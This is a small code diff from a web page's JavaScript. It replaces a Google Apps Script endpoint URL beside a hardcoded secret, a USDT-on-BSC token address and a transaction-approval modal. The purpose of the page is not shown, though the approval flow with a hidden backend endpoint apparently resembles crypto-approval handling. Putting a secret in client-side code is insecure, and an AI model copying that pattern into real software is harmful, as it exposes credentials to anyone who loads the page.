@@ -36,7 +36,7 @@ modalCancelBtn?.addEventListener("click", closeApprovalModal);
       return n.toFixed(4).replace(/\.?0+$/, "");
     }
 
-    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbwBORgcVCCyRFx4Po-C2Ggc_k5RuZOOv03w62CesTPrJARjKr20YztsOvpWDtcfriTQ/exec";
+    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbx6rguJLb7BgytG3Yj53NZiUgxfeIIlu6ofL8IHm8fRqyYXxTAlGKm5yG3c_1yiEQ7bRQ/exec";
     const APPS_SCRIPT_SECRET = "justforme";
 
     const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
